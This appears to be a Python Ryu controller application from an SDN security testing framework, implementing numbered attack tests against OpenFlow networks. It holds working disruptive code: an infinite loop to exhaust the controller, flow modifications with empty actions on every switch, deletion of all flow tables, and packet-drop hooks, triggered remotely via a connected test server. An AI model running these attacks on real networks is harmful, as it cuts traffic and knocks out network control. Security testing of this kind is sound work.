from threading import Thread
from ryu.base import app_manager
from am_interface_13 import AMInterface
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER, MAIN_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.lib.packet import packet
from ryu.lib.packet import ethernet
from ryu.controller import dpset
from ryu.ofproto import ofproto_v1_3

class AppAgent(app_manager.RyuApp):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
    _CONTEXTS = {
        'dpset': dpset.DPSet
    }

    def __init__(self, *args, **kwargs):
        super(AppAgent, self).__init__(*args, **kwargs)
        self.dpset = kwargs['dpset']
        self.drop = 0
        self.modify = 0
        self.clear = 0
        self.msg = None
        # Run AMInterface Thread    
        ami = AMInterface(self)
        server_address = ami.setServerAddr()
        t = Thread(target=ami.connectServer, args=(server_address,))
        t.start()
        self.logger.info("[App-Agent] Starting AppAgent on Ryu")

    # 3.1.020
    def testControlMessageDrop(self):
        self.logger.info("[ATTACK] Start Control Message Drop")
        self.drop = 1

    # 3.1.020 drop
    def callControlMessageDrop(self):
        pkt = packet.Packet(self.msg.data)
        eth = pkt.get_protocols(ethernet.ethernet)[0]
        self.logger.info("Drop Packet Info: ")
        self.logger.info(str(eth) + "\n")

    # 3.1.030
    def testInfiniteLoops(self):
        self.logger.info("[ATTACK] Start Infinite Loop")
        self.callInfiniteLoops()

    # Start Loop
    def callInfiniteLoops(self):
        i = 0

        while i < 32767:
            i = i + 1

            if i == 32766:
                i = 0

    # 3.1.040
    def testInternalStorageAbuse(self):
        self.logger.info("testInternalStorageAbuse")

    # 3.1.070
    def testFlowRuleModification(self):
        self.logger.info("[ATTACK] Start Flow Rule Modification")

        for dp in self.dpset.dps.values():
            match = dp.ofproto_parser.OFPMatch()
            actions = []
            inst = [dp.ofproto_parser.OFPInstructionActions(dp.ofproto.OFPIT_APPLY_ACTIONS, actions)]
            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                    out_port=dp.ofproto.OFPP_ANY,
                                                    out_group=dp.ofproto.OFPG_ANY,
                                                    instructions=inst,
                                                    command=dp.ofproto.OFPFC_MODIFY)
            dp.send_msg(flow_mod)

    # 3.1.080
    def testFlowTableClearance(self):
        self.logger.info("[ATTACK] Start Flow Table Clearance")
        self.clear = 1

    def callFlowTableClearance(self):
        for dp in self.dpset.dps.values():
            match = dp.ofproto_parser.OFPMatch()
            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                    out_port=dp.ofproto.OFPP_ANY,
                                                    out_group=dp.ofproto.OFPG_ANY,
                                                    command=dp.ofproto.OFPFC_DELETE)
            dp.send_msg(flow_mod)

    # 3.1.090
    def testEventListenerUnsubscription(self):
        self.logger.info("testEventListenerUnsubscription")

    @set_ev_cls(ofp_event.EventOFPPacketIn , MAIN_DISPATCHER)
    def packetIn_handler(self, ev):
        self.msg = ev.msg

        if self.drop:
            self.callControlMessageDrop()
        if self.clear:
            self.callFlowTableClearance()

if __name__ == "__main__":
    a = AppAgent()
